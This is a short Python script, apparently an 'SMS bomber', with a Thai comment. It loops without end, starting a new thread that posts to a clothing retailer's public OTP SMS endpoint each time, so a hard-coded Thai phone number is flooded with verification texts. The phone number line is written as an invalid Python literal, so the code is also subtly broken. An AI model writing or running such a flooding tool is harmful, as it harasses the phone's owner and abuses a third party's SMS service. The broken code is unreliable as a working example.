import requests
import threading

phonex = 0899788867 #ลบออก 1 ตัวเช่น 0899788867 เป็น 899788867 

def send():
    requests.post("https://api.gentlewomanonline.com/public/5e3548c2d32cb12606a34fb8/sms/otp", json={"to":f"+66{phonex}","from":"GENTLEWOMAN"})

while True:
    threading.Thread(target=send).start()